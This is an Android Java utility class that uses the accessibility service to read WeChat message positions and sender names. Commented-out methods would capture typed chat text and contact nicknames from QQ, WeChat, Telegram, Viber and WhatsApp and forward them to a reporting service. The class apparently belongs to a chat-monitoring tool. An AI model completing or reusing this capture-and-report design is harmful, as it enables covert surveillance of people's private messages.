package com.far.wxauto.access;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Rect;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by god on 2018/9/6.
 */

public class AccessUtils {
    private static final String TAG = "=eagle_access=";

    //此处检测相关服务是否处于开启状态,若关闭,就重新启动
    public static void reStartConfigService(Context mContext) {
        try {
//try            GetRunServiceUtils getRunServiceUtils = new GetRunServiceUtils(mContext);
//            getRunServiceUtils.aliveStateSer();
        } catch (Exception e) {

        }
    }

    // 0:左边   1:右边
    @SuppressLint("NewApi")
    public static int getPos(Context context, AccessibilityNodeInfo nodeInfo) {
        int v0 = 0;
        Rect rect = new Rect();
        nodeInfo.getBoundsInScreen(rect);
        DisplayMetrics displayMetrics = new DisplayMetrics();
        WindowManager manager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        manager.getDefaultDisplay().getMetrics(displayMetrics);
        int halfWidth = displayMetrics.widthPixels / 2;
        int nodeLeft = rect.left;
        int nodeRight = rect.right;
//        LogUtils.Logd(TAG, nodeInfo.getText() + "=nodeLeft=" + nodeLeft + "=nodeRight=" + nodeRight);
        if (nodeLeft >= halfWidth || nodeRight <= halfWidth) {    //自己
            if (nodeRight >= halfWidth) {
                v0 = nodeLeft > halfWidth ? 1 : 1;
//                LogUtils.Logd(TAG, System.currentTimeMillis() / 1000 + "=v0=" + v0);
            }
        } else if (Math.abs(halfWidth - nodeLeft) <= Math.abs(nodeRight - halfWidth)) {
//            LogUtils.Logd(TAG, System.currentTimeMillis() / 1000 + "=v0=else=" + v0);
            v0 = 1;
        }
        return v0;
    }

    public static String getWxSender(AccessibilityNodeInfo arg4) {
        @SuppressLint({"NewApi", "LocalSuppress"}) String v0 = arg4.getContentDescription().toString();
        return v0 == null || v0.length() <= 0 ? "" : v0.substring(0, v0.length() - "头像".length());
    }

    //处理键盘输入内容
    public static void startCap(Context mContext, String app, long time, int id, String regis_nickname, String friend_nickname, String strType, String strText) {
        String text = null;
        if (strText.startsWith("[") && strText.endsWith("]")) {
            text = strText.substring(1, strText.length() - 1);
        } else {
            text = strText;
        }
//
//        if (text != null && text.trim().length() != 0 && !"".equalsIgnoreCase(text.trim()) && !"null".equalsIgnoreCase(text.trim())) {
//            switch (app) {
//                case UrlConstants.QQ:
//                    startReport(mContext, app, time, id, regis_nickname,friend_nickname, strType, text);
//                    break;
//                case UrlConstants.WECHAT:
//                    startReport(mContext, app, time, id, regis_nickname,friend_nickname, strType, text);
//                    break;
//                case UrlConstants.TELEGRAM:
//                    startReport(mContext, app, time, id, regis_nickname,friend_nickname, strType, text);
//                    break;
//                case UrlConstants.VIBER:
//                    startReport(mContext, app, time, id, regis_nickname,friend_nickname, strType, text);
//                    break;
//                case UrlConstants.WHATSAPP:
//                    startReport(mContext, app, time, id, regis_nickname,friend_nickname, strType, text);
//                    break;
//            }
//        }
    }

    public static void startReport(Context mContext, String app, long time, int id, String regis_nickname, String friend_nickname, String localAction, String text) {
//        LogUtils.Logd("=access=", "--keyboard_on--" + app);
//        Intent intent = new Intent(mContext, ChangeNotifyService.class);
//        intent.putExtra("data", formJsData(app, 9));
//        intent.putExtra("start_time", time);
//        intent.putExtra("windows_id", id);
//        intent.putExtra("regis_nickname", regis_nickname);
//        intent.putExtra("friend_nickname", friend_nickname);
//        intent.putExtra("local_action", localAction);
//        intent.putExtra("text", text);
//        mContext.startService(intent);
    }

    private static String formJsData(String appNme, int type) {
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("app", appNme);
            jsonObject.put("type", type);
            return jsonObject.toString();
        } catch (JSONException e) {
            return "";
        }
    }

}
